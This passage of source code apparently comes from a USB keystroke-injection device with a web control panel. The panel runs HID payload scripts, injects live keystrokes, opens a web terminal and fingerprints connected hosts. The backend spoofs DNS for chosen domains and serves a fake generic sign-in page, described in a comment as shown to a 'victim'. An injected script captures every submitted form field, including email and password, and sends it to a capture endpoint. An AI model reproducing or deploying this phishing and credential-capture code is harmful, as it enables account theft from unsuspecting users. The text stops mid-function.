    if (r.ok) { toast('ran ' + currentScript); $('#scriptStatus').textContent = 'ok'; }
    else      { toast('run failed rc=' + (r.rc != null ? r.rc : '?'), true);
                $('#scriptStatus').textContent = 'failed'; }
  } else {
    // unsaved buffer — run via tmp endpoint without needing a name
    $('#scriptStatus').textContent = 'running temp...';
    const r = await api('/api/scripts/_runtemp', { method:'POST', body });
    if (r.ok) { toast('ran (unsaved buffer)'); $('#scriptStatus').textContent = 'ok (temp)'; }
    else      { toast('run failed rc=' + (r.rc != null ? r.rc : '?'), true);
                $('#scriptStatus').textContent = 'failed'; }
  }
}
async function scriptStop() {
  const r = await api('/api/hid/stop', { method:'POST' });
  toast('stopped (killed ' + (r.killed||0) + ')');
  $('#scriptStatus').textContent = 'stopped';
}
function scriptClear() {
  if (!confirm('clear editor?')) return;
  $('#scriptArea').value = '';
  updateGutter();
}

/* --- extensions --- */
let currentExt = null;      // if set, editor is in "edit extension" mode
async function extsRefresh() {
  const l = await api('/api/extensions');
  const ul = $('#extList');
  if (!Array.isArray(l) || !l.length) {
    ul.innerHTML = '<li class="dim">no extensions</li>';
    $('#extCount').textContent = '(0)';
    return;
  }
  $('#extCount').textContent = `(${l.length})`;
  ul.innerHTML = l.map(f =>
    `<li data-name="${esc(f.name)}" onclick="extOpen('${esc(f.name)}')"
         class="${currentExt === f.name ? 'active' : ''}">
       <span class="fl-del" onclick="event.stopPropagation(); extDelete('${esc(f.name)}')">✕</span>
       EXTENSION ${esc(f.name)}
     </li>`
  ).join('');
}
async function extOpen(name) {
  const t = await api('/api/extensions/' + encodeURIComponent(name));
  $('#scriptArea').value = typeof t === 'string' ? t : '';
  currentExt = name;
  currentScript = null;
  $('#editorTitle').textContent = 'EXTENSION ' + name;
  $('#scriptStatus').textContent = 'editing extension';
  updateGutter();
  extsRefresh();
  scriptsRefresh();
}
async function extsNew() {
  const name = ($('#newExtName').value || '').trim();
  if (!/^[A-Za-z0-9][A-Za-z0-9._-]{0,63}$/.test(name)) {
    toast('name must be [A-Za-z0-9][A-Za-z0-9._-]*', true); return;
  }
  const r = await fetch('/api/extensions/' + encodeURIComponent(name), {
    method:'POST', body: 'REM ' + name + ' extension\n' });
  const j = await r.json();
  if (j.ok) { $('#newExtName').value = ''; extsRefresh(); extOpen(name); }
  else      { toast('create failed: ' + (j.err || ''), true); }
}
async function extDelete(name) {
  if (!confirm('delete extension ' + name + '?')) return;
  const r = await fetch('/api/extensions/' + encodeURIComponent(name), { method:'DELETE' });
  if (r.ok) {
    if (currentExt === name) {
      currentExt = null;
      $('#editorTitle').textContent = '(untitled)';
      $('#scriptArea').value = '';
      updateGutter();
    }
    extsRefresh();
  }
}

/* --- layouts --- */
async function layoutsRefresh() {
  const l = await api('/api/layouts');
  const sel = $('#layoutSel');
  const cfg = await api('/api/config');
  let current = 'us';
  if (typeof cfg === 'string') {
    const m = cfg.match(/^HID_LAYOUT=(.*)$/m);
    if (m) current = m[1].split('#')[0].trim() || 'us';
  }
  sel.innerHTML = (Array.isArray(l) ? l : []).map(n =>
    `<option value="${esc(n)}" ${n===current?'selected':''}>${esc(n)}</option>`
  ).join('');
}
async function setLayout(name) {
  let cfg = await api('/api/config');
  if (typeof cfg !== 'string') return;
  if (/^HID_LAYOUT=.*$/m.test(cfg)) cfg = cfg.replace(/^HID_LAYOUT=.*$/m, 'HID_LAYOUT=' + name);
  else cfg = cfg.replace(/$/, '\nHID_LAYOUT=' + name + '\n');
  const r = await api('/api/config', { method:'POST', body: cfg });
  if (r.ok) toast('layout = ' + name);
}

/* ============================================================
   Live Typing
   ============================================================ */
const JS_TO_HID = {
  'Enter':0x28,'NumpadEnter':0x28,'Escape':0x29,'Tab':0x2B,'Space':0x2C,
  'Backspace':0x2A,'Delete':0x4C,'Insert':0x49,
  'ArrowUp':0x52,'ArrowDown':0x51,'ArrowLeft':0x50,'ArrowRight':0x4F,
  'Home':0x4A,'End':0x4D,'PageUp':0x4B,'PageDown':0x4E,
  'CapsLock':0x39,'NumLock':0x53,'ScrollLock':0x47,
  'PrintScreen':0x46,'Pause':0x48,'ContextMenu':0x65,
  'Minus':0x2D,'Equal':0x2E,'BracketLeft':0x2F,'BracketRight':0x30,
  'Backslash':0x31,'Semicolon':0x33,'Quote':0x34,'Backquote':0x35,
  'Comma':0x36,'Period':0x37,'Slash':0x38,
};
for (let i = 1; i <= 12; i++) JS_TO_HID[`F${i}`] = 0x39 + i;

function keyEventToHid(e) {
  // returns {mod, key} using the browser's physical key info (US positional).
  // We rely on the device's HID_LAYOUT for STRING char lookup; here, Live
  // typing is positional (US scancodes) because the browser gives us codes.
  const code = e.code;
  let key = 0;
  if (JS_TO_HID[code] != null) key = JS_TO_HID[code];
  else if (/^Key([A-Z])$/.test(code))    key = 0x04 + code.charCodeAt(3) - 65;        // KeyA..Z
  else if (/^Digit([0-9])$/.test(code)) {
    const d = parseInt(code.slice(5), 10);
    key = d === 0 ? 0x27 : 0x1E + (d - 1);
  }
  else if (/^Numpad([0-9])$/.test(code)) {
    const d = parseInt(code.slice(6), 10);
    key = d === 0 ? 0x62 : 0x59 + (d - 1);
  }
  if (!key) return null;
  let mod = 0;
  if (e.shiftKey) mod |= 0x02;
  if (e.ctrlKey)  mod |= 0x01;
  if (e.altKey)   mod |= 0x04;
  if (e.metaKey)  mod |= 0x08;
  return { mod, key };
}

async function liveSend(mod, keys) {
  try {
    await fetch('/api/live/key', {
      method:'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({ mod, keys })
    });
  } catch(e) {}
}
async function liveSendSpecial(name) {
  const K = {'ENTER':0x28,'TAB':0x2B,'ESC':0x29,'BACKSPACE':0x2A,'DELETE':0x4C,'SPACE':0x2C};
  if (K[name]) await liveSend(0, [K[name]]);
}
async function liveSendCombo(...tokens) {
  let mod = 0;
  const keys = [];
  const MOD_MAP = {'CTRL':0x01,'SHIFT':0x02,'ALT':0x04,'GUI':0x08,'WIN':0x08,'WINDOWS':0x08};
  const NAMED = {'ENTER':0x28,'TAB':0x2B,'ESC':0x29,'BACKSPACE':0x2A,'DELETE':0x4C,'SPACE':0x2C};
  for (const t of tokens) {
    const up = t.toUpperCase();
    if (MOD_MAP[up] != null) mod |= MOD_MAP[up];
    else if (NAMED[up] != null) keys.push(NAMED[up]);
    else if (t.length === 1 && /[a-z]/i.test(t)) keys.push(0x04 + t.toUpperCase().charCodeAt(0) - 65);
  }
  await liveSend(mod, keys);
}

function bindLiveTyping() {
  const ta = $('#liveInput');
  ta.addEventListener('keydown', e => {
    if (!$('#liveEn').checked) return;
    // Allow browser default for shortcuts outside the typing surface
    const h = keyEventToHid(e);
    if (!h) return;
    e.preventDefault();
    liveSend(h.mod, [h.key]);
    const stat = $('#liveStatus');
    stat.textContent = `sent mod=${h.mod.toString(16)} key=${h.key.toString(16)}`;
    clearTimeout(stat._t);
    stat._t = setTimeout(() => stat.textContent = 'armed', 1200);
  });
}

/* ============================================================
   Terminal (xterm.js over SSE + POST)
   ============================================================ */
let xtermLoaded = false;
let xterm = null;
let xtermFit = null;
let sseStream = null;

function loadCss(href) {
  return new Promise((res, rej) => {
    if ($$('link[href="' + href + '"]').length) return res();
    const l = document.createElement('link');
    l.rel = 'stylesheet'; l.href = href;
    l.onload = res; l.onerror = rej;
    document.head.appendChild(l);
  });
}
function loadScript(src) {
  return new Promise((res, rej) => {
    if ($$('script[src="' + src + '"]').length) return res();
    const s = document.createElement('script');
    s.src = src; s.async = true;
    s.onload = res; s.onerror = rej;
    document.head.appendChild(s);
  });
}

async function cliProbe() {
  try {
    const r = await fetch('/api/auth/me');
    const j = await r.json();
    if (j.authed) {
      $('#termLogin').style.display = 'none';
      $('#termView').style.display  = 'block';
      $('#termUser').textContent    = j.user;
      await ensureXterm();
    } else {
      $('#termLogin').style.display = 'block';
      $('#termView').style.display  = 'none';
      teardownXterm();
    }
  } catch(e) {
    $('#termLogin').style.display = 'block';
  }
}

async function ensureXterm() {
  if (!xtermLoaded) {
    await loadCss('/xterm.css');
    await loadScript('/xterm.js');
    await loadScript('/xterm-addon-fit.js');
    xtermLoaded = true;
  }
  if (xterm) { xtermFit && xtermFit.fit(); return; }
  xterm = new Terminal({
    cursorBlink: true,
    fontFamily: '"Fira Code","Consolas","Menlo",monospace',
    fontSize: 13,
    scrollback: 2000,
    theme: {
      background:'#000', foreground:'#c3e3bd', cursor:'#4CAF50',
      brightBlue:'#58a6ff', brightGreen:'#8ddc9e', red:'#f55',
    },
  });
  try { xtermFit = new FitAddon.FitAddon(); xterm.loadAddon(xtermFit); } catch(e) {}
  xterm.open($('#xtermHost'));
  try { xtermFit && xtermFit.fit(); } catch(e) {}
  // input → POST raw bytes to pty master
  xterm.onData(async data => {
    try {
      await fetch('/api/cli/input', { method:'POST', body: data });
    } catch(e) {}
  });
  // report size to the pty so curses apps lay out right
  const sendSize = async () => {
    try {
      await fetch('/api/cli/resize', {
        method:'POST', headers:{'Content-Type':'application/json'},
        body: JSON.stringify({ rows: xterm.rows, cols: xterm.cols })
      });
    } catch(e) {}
  };
  xterm.onResize(sendSize);
  // SSE: pty master → xterm
  openStream();
  // first fit after mount
  setTimeout(() => { try { xtermFit && xtermFit.fit(); sendSize(); } catch(e) {} }, 50);
  // refit on window resize
  window.addEventListener('resize', () => { try { xtermFit && xtermFit.fit(); } catch(e) {} });
}

function openStream() {
  if (sseStream) { try { sseStream.close(); } catch(e) {} sseStream = null; }
  sseStream = new EventSource('/api/cli/stream');
  sseStream.onmessage = ev => {
    try {
      const bytes = atob(ev.data);
      if (xterm) xterm.write(bytes);
    } catch(e) {}
  };
  sseStream.onerror = () => {
    // if the session expired, server returned 401 and SSE drops; probe
    cliProbe();
  };
}

function teardownXterm() {
  if (sseStream) { try { sseStream.close(); } catch(e) {} sseStream = null; }
  if (xterm)    { try { xterm.dispose(); } catch(e) {} xterm = null; xtermFit = null; }
}

async function cliLogin() {
  const user = $('#loginUser').value;
  const pass = $('#loginPass').value;
  $('#loginMsg').textContent = 'checking...';
  const r = await fetch('/api/auth/login', {
    method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify({user, pass})
  });
  const j = await r.json();
  if (j.ok) {
    $('#loginMsg').textContent = '';
    $('#loginPass').value = '';
    cliProbe();
  } else {
    $('#loginMsg').textContent = j.err || 'login failed';
  }
}
async function cliLogout() {
  teardownXterm();
  await fetch('/api/auth/logout', { method:'POST' });
  cliProbe();
}
function bindTerminal() {
  $('#loginPass').addEventListener('keydown', e => {
    if (e.key === 'Enter') { e.preventDefault(); cliLogin(); }
  });
}

/* --- boot: wire everything + first paint ---------------------------------- */
(function boot() {
  const h = (location.hash || '#Live').slice(1);
  openTab(TABS.includes(h) ? h : 'Live');
  loadCfg();
  tick();
  setInterval(tick, 2000);
  refreshNetLink();
  setInterval(refreshNetLink, 2500);
  // live-save for switches
  bindLiveSave();
  // Scripting
  bindEditor();
  updateGutter();
  scriptsRefresh();
  extsRefresh();
  layoutsRefresh();
  // Live typing
  bindLiveTyping();
  // Terminal
  bindTerminal();
  cliProbe();
})();
"""


# ====== helpers =============================================================

def ifaces_snapshot():
    out = []
    try:
        with open("/proc/net/dev") as f:
            for ln in f.readlines()[2:]:
                name = ln.split(":")[0].strip()
                if not name: continue
                s = Path(f"/sys/class/net/{name}/statistics")
                stat = {}
                for k, fn in (("rx_b","rx_bytes"),("tx_b","tx_bytes"),
                              ("rx_p","rx_packets"),("tx_p","tx_packets")):
                    try: stat[k] = int((s/fn).read_text())
                    except Exception: stat[k] = 0
                ipv4 = None
                try:
                    r = subprocess.run(["ip","-4","-o","addr","show","dev",name],
                                       capture_output=True, text=True, timeout=2)
                    m = re.search(r"inet (\S+)", r.stdout)
                    if m: ipv4 = m.group(1)
                except Exception: pass
                mac = None
                try: mac = Path(f"/sys/class/net/{name}/address").read_text().strip()
                except Exception: pass
                state = "down"
                try: state = Path(f"/sys/class/net/{name}/operstate").read_text().strip()
                except Exception: pass
                out.append({"name": name, "state": state, "ipv4": ipv4, "mac": mac, **stat})
    except Exception: pass
    return out


def tail_file(p: Path, n_lines: int = 40) -> str:
    try:
        with open(p, "rb") as f:
            f.seek(0, 2); size = f.tell(); back = min(size, 32768)
            f.seek(size - back)
            tail = f.read().decode("utf-8", "replace")
        return "\n".join(tail.splitlines()[-n_lines:])
    except Exception: return ""


def read_dhcp_leases():
    out = []
    if not LEASE_PATH.exists(): return out
    try:
        for ln in LEASE_PATH.read_text().splitlines():
            parts = ln.split()
            if len(parts) < 4: continue
            out.append({
                "expires": int(parts[0]), "mac": parts[1],
                "ip": parts[2],
                "host": parts[3] if parts[3] != "*" else None,
                "id": parts[4] if len(parts) > 4 else None,
            })
    except Exception: pass
    return out


def read_stats():
    try: return json.loads(STATS_PATH.read_text())
    except Exception: return {}


def _oui_vendor(mac):
    """Best-effort OEM lookup from the OUI prefix of a MAC. We ship a tiny
    hand-picked table of the vendors we actually see on consumer hardware
    plus some brands popular with the Luckfox / rubber-ducky crowd. No
    big-table lookup — this is a hint, not identity."""
    if not mac: return ""
    pfx = mac.upper().replace("-", ":").split(":")
    if len(pfx) < 3: return ""
    key = ":".join(pfx[:3])
    return _OUI_MAP.get(key, "")


_OUI_MAP = {
    # a handful of the most common consumer OUIs — enough that most users
    # see a label on their own laptop. Extend by editing this dict.
    "00:50:56": "VMware",  "00:0C:29": "VMware",   "00:1C:14": "VMware",
    "08:00:27": "VirtualBox", "52:54:00": "QEMU/KVM",
    "DC:A6:32": "Raspberry Pi", "B8:27:EB": "Raspberry Pi",
    "F0:18:98": "Apple",     "AC:DE:48": "Apple",   "D8:9E:F3": "Apple",
    "3C:A6:F6": "Apple",     "7C:D1:C3": "Apple",
    "88:66:5A": "Intel",     "D4:3B:04": "Intel",   "C8:F7:50": "Intel",
    "00:1F:3B": "Intel",     "A4:C3:F0": "Intel",
    "7C:B2:7D": "Dell",      "F8:B1:56": "Dell",    "D4:81:D7": "Dell",
    "48:0F:CF": "ASUS",      "60:A4:4C": "ASUS",    "AC:22:0B": "ASUS",
    "70:85:C2": "ASUS",
    "E0:9D:31": "HP",        "A0:A3:3B": "HP",      "28:80:88": "HP",
    "00:08:A1": "Microsoft (Surface)", "C8:3F:26": "Microsoft (Surface)",
    "60:45:BD": "Microsoft (Surface)", "28:18:78": "Microsoft (Surface)",
    "9C:5A:44": "Lenovo",    "28:F0:76": "Lenovo",  "68:F7:28": "Lenovo",
    "F4:5C:89": "Lenovo",
    "DE:2A:CC": "Random (locally-admin)",  # the user's Flo_Laptop :)
}


def _fingerprint_os(mac=None, hostname=None):
    """Guess the host OS from DHCP breadcrumbs. Returns a dict with a
    best-guess family and the signal we used."""
    hints = []
    guess = "unknown"
    hn = (hostname or "").strip()
    if hn:
        hl = hn.lower()
        # Windows-y names: DESKTOP-xxx, LAPTOP-xxx, PC-xxx, WIN-xxx
        if re.match(r"^(desktop|laptop|pc|win)-", hl):
            guess = "windows"; hints.append("hostname pattern")
        elif hl.endswith(".local") or re.match(r"^[a-z]+-?s[- ]?mac", hl):
            guess = "macos";   hints.append("hostname pattern")
        elif hl.startswith("android-") or hl.startswith("samsung-"):
            guess = "android"; hints.append("hostname pattern")
        elif hl.startswith("iphone") or hl.startswith("ipad"):
            guess = "ios";     hints.append("hostname pattern")
    # locally-administered MACs (bit 1 of first octet set) are what Windows 10+
    # uses for Wi-Fi randomization and Linux systemd-networkd uses too.
    if mac:
        try:
            first = int(mac.replace("-", ":").split(":")[0], 16)
            if first & 0x02:
                hints.append("locally-admin MAC (randomized)")
        except Exception: pass
    return {"guess": guess, "hints": hints}


def _check_internet(timeout=1.5):
    """Non-blocking-ish check: can we reach 1.1.1.1:53 via TCP? Returns
    {ok: bool, latency_ms: int|None, via: 'eth0'|'usb0'|'none'}."""
    import socket as _socket
    t0 = time.time()
    s = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        s.connect(("1.1.1.1", 53))
        ms = int((time.time() - t0) * 1000)
        # Which iface was the route taken via? read /proc/net/route for
        # the default gateway iface.
        via = "unknown"
        try:
            for ln in Path("/proc/net/route").read_text().splitlines()[1:]:
                parts = ln.split()
                if len(parts) >= 4 and parts[1] == "00000000":
                    via = parts[0]; break
        except Exception: pass
        return {"ok": True, "latency_ms": ms, "via": via}
    except Exception as e:
        return {"ok": False, "err": str(e), "latency_ms": None, "via": "none"}
    finally:
        try: s.close()
        except Exception: pass


def _honeypot_apply_ip(cfg=None):
    """Add the honeypot's secondary IP to usb0 when HONEYPOT=TRUE, remove
    it when HONEYPOT=FALSE. Idempotent — EEXIST / ENOENT are both fine.
    Returns the IP currently assigned (or '' if none)."""
    if cfg is None: cfg = load_cfg()
    want = cfg.get("HONEYPOT","FALSE").upper() == "TRUE"
    ip   = (cfg.get("HONEYPOT_IP","") or "").strip()
    if not ip:
        return ""
    iface = cfg.get("DNSMASQ_IFACE","usb0") or "usb0"
    try:
        if want:
            subprocess.run(["ip","addr","add",f"{ip}/16","dev",iface],
                           capture_output=True, timeout=3)
        else:
            subprocess.run(["ip","addr","del",f"{ip}/16","dev",iface],
                           capture_output=True, timeout=3)
    except Exception: pass
    # verify
    try:
        r = subprocess.run(["ip","-o","addr","show","dev",iface],
                           capture_output=True, text=True, timeout=2)
        return ip if (ip in r.stdout) else ""
    except Exception:
        return ip if want else ""


def _honeypot_rules(cfg):
    """Parse HONEYPOT_RULES config block. One rule per line. The DSL is
    intentionally forgiving — we accept extra whitespace, commas, equals,
    and both direction forms:
        ON SIGN_IN REDIRECT_TO https://google.com
        ON WEBSITE_VISIT google.com REDIRECT_HONEYPOT
    The second form adds `google.com` to the honeypot's trap list at
    runtime so a user who visits google.com (via the WebBee's DNS) gets
    the honeypot page served.
    Returns a list of dicts: {trigger, to?, host?}.
    """
    out = []
    raw = cfg.get("HONEYPOT_RULES", "") or ""
    # Allow rules joined by ; or newlines
    for line in re.split(r"[;\n]", raw):
        s = line.strip().strip(",")
        if not s or s.startswith("#"): continue
        # Drop leading "ON "
        if s.upper().startswith("ON "): s = s[3:].lstrip()
        # Form A: SIGN_IN  REDIRECT_TO  https://x   (also accepts "=")
        m = re.match(r"^SIGN_IN\s*=?\s*REDIRECT(?:_TO)?\s+(\S+)\s*$", s, re.IGNORECASE)
        if m:
            out.append({"trigger": "SIGN_IN", "to": m.group(1)})
            continue
        # Form B: WEBSITE_VISIT=google.com REDIRECT_HONEYPOT
        m = re.match(r"^WEBSITE_VISIT\s*=?\s*(\S+?)\s+REDIRECT_HONEYPOT\s*$", s, re.IGNORECASE)
        if m:
            out.append({"trigger": "WEBSITE_VISIT", "host": m.group(1).lower()})
            continue
    return out


def _honeypot_emit_verdict(rec):
    """Append a verdict record to the current rec_NNNNNN.jsonl so the Live
    tab's /api/live tail_verdicts picks it up immediately."""
    VER_DIR.mkdir(parents=True, exist_ok=True)
    # Reuse the newest verdict ring file so we don't fight sniff.py's
    # rotation; create one if none exist yet.
    files = sorted(VER_DIR.glob("rec_*.jsonl"), key=lambda p: p.stat().st_mtime, reverse=True)
    if files:
        target = files[0]
    else:
        target = VER_DIR / "rec_000000.jsonl"
    try:
        with open(target, "a") as f:
            f.write(json.dumps(rec) + "\n")
    except Exception: pass


def tail_verdicts(n=50):
    try:
        files = sorted(VER_DIR.glob("rec_*.jsonl"), key=lambda p: p.stat().st_mtime, reverse=True)
    except Exception: return []
    lines = []
    for f in files[:2]:
        try:
            with open(f, "rb") as fh:
                fh.seek(0, 2); size = fh.tell(); back = min(size, 32768)
                fh.seek(size - back)
                lines[0:0] = fh.read().decode("utf-8","replace").splitlines()[-n:]
        except Exception: pass
        if len(lines) >= n: break
    out = []
    for s in lines[-n:]:
        try: out.append(json.loads(s))
        except Exception: pass
    return out


def uptime_str():
    try:
        with open("/proc/uptime") as f: up = float(f.read().split()[0])
        h = int(up // 3600); m = int((up % 3600) // 60)
        return f"{h}h{m:02d}m"
    except Exception: return "-"


# -------- host-based redirect decision --------------------------------------
# When REDIRECT=TRUE, we check the Host: header before serving the normal
# WebUI. This is what makes a browser visit to a spoofed host actually
# redirect without needing a separate :8080 forwarder — dnsmasq points A
# records at us, we land on :80 here, and we decide 302 vs serve-UI from the
# Host header.

def should_redirect(host_hdr: str, cfg: dict):
    if not host_hdr: return None
    if cfg.get("REDIRECT", "FALSE").upper() != "TRUE": return None
    pats = [p.strip().lower() for p in (cfg.get("REDIRECT_FROM","") or "").split(",") if p.strip()]
    if not pats: return None
    h = host_hdr.split(":")[0].strip().lower()
    # 172.32.0.93 and ghostlink.local are always "local admin" — never redirect
    if h in ("172.32.0.93", "ghostlink.local", "localhost", "127.0.0.1"): return None
    for p in pats:
        p = p.lower()
        if p.startswith("http://"):  p = p[7:]
        if p.startswith("https://"): p = p[8:]
        p = p.split("/")[0]
        if h == p or h.endswith("." + p): return cfg.get("REDIRECT_TO", "172.32.0.93")
    return None


# ====== bundled honeypot HTML (used if the user hasn't uploaded one) =======
DEFAULT_HONEYPOT_HTML = """<!doctype html>
<html lang=en><head><meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<title>Sign in</title>
<style>
body { font: 14px/1.5 -apple-system,"Segoe UI",system-ui,sans-serif;
       background:#f7f8fa; color:#1a1a1a; margin:0;
       display:flex; align-items:center; justify-content:center; min-height:100vh; }
.card { background:#fff; padding:36px 32px; border-radius:10px;
        box-shadow:0 2px 20px rgba(0,0,0,.06); width:100%; max-width:360px; }
h1 { margin:0 0 6px; font-size:22px; }
p  { margin:0 0 20px; color:#5f6368; font-size:13px; }
input { width:100%; padding:12px 14px; font-size:14px; border:1px solid #dadce0;
        border-radius:6px; margin:6px 0; box-sizing:border-box; }
input:focus { outline:none; border-color:#1a73e8; }
button { width:100%; margin-top:12px; padding:12px; background:#1a73e8;
         color:#fff; border:0; border-radius:6px; font-size:14px; cursor:pointer; }
button:hover { background:#1557b0; }
.foot { font-size:11px; color:#9aa0a6; margin-top:18px; text-align:center; }
</style></head><body>
<div class=card>
<h1>Sign in</h1>
<p>to continue to your account</p>
<form method=post action="/_honeypot_submit">
  <input type=email name=email placeholder="Email or phone" autocomplete=username autofocus required>
  <input type=password name=password placeholder="Password" autocomplete=current-password required>
  <button type=submit>Next</button>
</form>
<div class=foot>Verify this is a secure connection before signing in.</div>
</div>
</body></html>
"""


# ====== HTTP handler ========================================================

class Handler(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a, **k): pass

    def _send(self, code, ctype, body, extra=None):
        if isinstance(body, str): body = body.encode("utf-8")
        try:
            self.send_response(code)
            self.send_header("Content-Type", ctype)
            self.send_header("Content-Length", str(len(body)))
            self.send_header("Cache-Control", "no-store")
            for k, v in (extra or {}).items(): self.send_header(k, v)
            self.end_headers()
            self.wfile.write(body)
        except (BrokenPipeError, ConnectionResetError, OSError):
            # client closed the connection mid-response (tab switch, poll
            # cycle collide). This is noise — swallow it so the thread
            # doesn't dump a stack trace into the log.
            pass

    def _send_json(self, obj, code=200):
        self._send(code, "application/json", json.dumps(obj))

    def _free_mb(self):
        try:
            st = os.statvfs("/root"); return int(st.f_bavail * st.f_bsize / 1024 / 1024)
        except Exception: return -1

    # ---- session helpers ---------------------------------------------------
    def _cookie_token(self):
        c = self.headers.get("Cookie", "") or ""
        for part in c.split(";"):
            k, _, v = part.strip().partition("=")
            if k == "gl_sess":
                return v
        return ""

    def _auth_user(self):
        """Return username if request has a valid session, else ''."""
        tok = self._cookie_token()
        if tok:
            u = _session_valid(tok)
            if u: return u
        # Bearer header fallback
        a = self.headers.get("Authorization", "") or ""
        if a.lower().startswith("bearer "):
            u = _session_valid(a[7:].strip())
            if u: return u
        return ""

    def _require_auth(self):
        """Return True if request passes; otherwise respond 401 + False."""
        if self._auth_user():
            return True
        self._send_json({"ok": False, "err": "auth required"}, code=401)
        return False

    def _client_ip(self):
        return self.client_address[0] if self.client_address else "?"

    def _session_key(self) -> str:
        """Return the actual session token for the current request. Covers
        both cookie and Bearer-header auth, falls back to empty str if
        unauthed. Callers for pty / CLI endpoints must refuse empty keys so
        multiple unauthed clients can't share one pty."""
        tok = self._cookie_token()
        if tok and _session_valid(tok): return tok
        a = self.headers.get("Authorization", "") or ""
        if a.lower().startswith("bearer "):
            b = a[7:].strip()
            if _session_valid(b): return b
        return ""

    def _send_file_or_404(self, p: Path, ctype: str):
        try: body = p.read_bytes()
        except Exception:
            return self._send(404, "text/plain", "not found\n")
        self._send(200, ctype, body)

    def _cli_stream(self, token: str):
        """SSE loop that reads pty master and writes base64 chunks."""
        import base64
        s = pty_open(token)
        fd = s["fd"]
        try:
            self.send_response(200)
            self.send_header("Content-Type", "text/event-stream")
            self.send_header("Cache-Control", "no-store")
            self.send_header("X-Accel-Buffering", "no")
            self.send_header("Connection", "close")
            self.end_headers()
            # kick a redraw so xterm shows an initial prompt
            try: os.write(fd, b"\n")
            except Exception: pass
            while True:
                r, _, _ = select.select([fd], [], [], 15)
                if r:
                    try:
                        chunk = os.read(fd, 4096)
                        if not chunk: break
                        b64 = base64.b64encode(chunk).decode()
                        self.wfile.write(f"data: {b64}\n\n".encode())
                        self.wfile.flush()
                    except OSError: break
                else:
                    # keep-alive comment every 15s so proxies don't give up
                    try:
                        self.wfile.write(b": keep-alive\n\n")
                        self.wfile.flush()
                    except (BrokenPipeError, ConnectionResetError, OSError):
                        break
        except (BrokenPipeError, ConnectionResetError, OSError):
            pass

    def _maybe_honeypot(self):
        """Serve the fake sign-in page when EITHER
          (a) the request landed on the dedicated honeypot IP, OR
          (b) HONEYPOT=TRUE AND the Host header matches a REDIRECT_FROM
              or WEBSITE_VISIT pattern.
        Form POSTs to /_honeypot_submit get captured + logged + redirected."""
        cfg = load_cfg()
        if cfg.get("HONEYPOT", "FALSE").upper() != "TRUE": return False

        # (a) Did we land on the honeypot IP? Separates the admin UI
        # (always on .93) from the trap (its own .254 by default).
        hp_ip = (cfg.get("HONEYPOT_IP","") or "").strip()
        local_ip = ""
        try: local_ip = self.connection.getsockname()[0]
        except Exception: pass
        hit_hp_ip = bool(hp_ip and local_ip and local_ip == hp_ip)

        host = (self.headers.get("Host","") or "").split(":")[0].strip().lower()

        if not hit_hp_ip:
            # (b) Host-based intercept. Only triggers for OTHER host names —
            # hitting the admin IP by name/host never serves the honeypot.
            if not host: return False
            if host in ("172.32.0.93", "ghostlink.local", "localhost", "127.0.0.1"): return False
            pats = [p.strip().lower() for p in (cfg.get("REDIRECT_FROM","") or "").split(",") if p.strip()]
            for r in _honeypot_rules(cfg):
                if r.get("trigger") == "WEBSITE_VISIT" and r.get("host"):
                    pats.append(r["host"])
            pats_norm = []
            for pp in pats:
                if pp.startswith("http://"):  pp = pp[7:]
                if pp.startswith("https://"): pp = pp[8:]
                pats_norm.append(pp.split("/")[0])
            matches = (host in pats_norm) or any(host.endswith("." + p) for p in pats_norm)
            if not matches: return False

        # Only intercept GET; let the POST capture handler run on its own
        if self.path == "/_honeypot_submit": return False     # POST handler
        html = ""
        try: html = HONEY_HTML.read_text(encoding="utf-8")
        except Exception:
            html = DEFAULT_HONEYPOT_HTML
        # inject a tiny JS shim that intercepts form submits and POSTs them
        # to /_honeypot_submit so EVERY form (whatever markup the user
        # uploads) gets captured without having to edit the HTML.
        shim = """
<script>
document.addEventListener('submit', function(e){
  const f = e.target; if (!f || f.tagName!=='FORM') return;
  e.preventDefault();
  const d = {};
  for (const el of f.elements) {
    if (!el.name) continue;
    d[el.name] = el.type==='checkbox' ? !!el.checked : el.value;
  }
  d._src_host = location.host; d._ua = navigator.userAgent;
  fetch('/_honeypot_submit', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify(d)})
    .then(r => r.json()).then(j => { if (j && j.to) location.href = j.to; });
});
</script>"""
        if "</body>" in html.lower():
            html = re.sub(r"</body>", shim + "</body>", html, count=1, flags=re.IGNORECASE)
        else:
            html = html + shim
        self._send(200, "text/html; charset=utf-8", html,
                   extra={"X-GhostLink-Honeypot": "1"})
        try:
            with open(LOG_PATH, "a") as f:
                f.write(f"{time.strftime('%H:%M:%S')} webui HONEYPOT serve Host={host} path={self.path}\n")
        except Exception: pass
        return True

    def _maybe_redirect(self):
        # Honeypot intercepts BEFORE the 302 redirect so a victim who hits a
        # REDIRECT_FROM host sees the fake login instead of bouncing away.
        if self._maybe_honeypot(): return True
        host = self.headers.get("Host", "")
        cfg = load_cfg()
        to = should_redirect(host, cfg)
        if to is None: return False
        if not to.startswith("http"): to = "http://" + to
        # Loop guard: if the destination host is itself a REDIRECT_FROM
        # pattern, we'd just send the browser back to ourselves. Refuse
        # and serve the UI instead (so the admin sees the misconfiguration).
        try:
            to_host = (urlparse(to).hostname or "").lower()
        except Exception:
            to_host = ""
        pats = [p.strip().lower() for p in (cfg.get("REDIRECT_FROM","") or "").split(",") if p.strip()]
        pats_norm = []
        for pp in pats:
            if pp.startswith("http://"):  pp = pp[7:]
            if pp.startswith("https://"): pp = pp[8:]
            pats_norm.append(pp.split("/")[0])
        if to_host and (to_host in pats_norm or
                        any(to_host.endswith("." + p) for p in pats_norm) or
                        to_host == "172.32.0.93"):
            try:
                with open(LOG_PATH, "a") as f:
                    f.write(f"{time.strftime('%H:%M:%S')} webui REFUSE self-redirect loop Host={host} -> {to}\n")
            except Exception: pass
            return False  # fall through to serve UI
        preserve = cfg.get("REDIRECT_PRESERVE_PATH","TRUE").upper() == "TRUE"
        loc = to + (self.path if preserve and self.path and self.path != "/" else "")
        self.send_response(302)
        self.send_header("Location", loc)
        self.send_header("Content-Length", "0")
        self.send_header("Cache-Control", "no-store")
        self.send_header("Connection", "close")
        self.end_headers()
        try:
            with open(LOG_PATH, "a") as f:
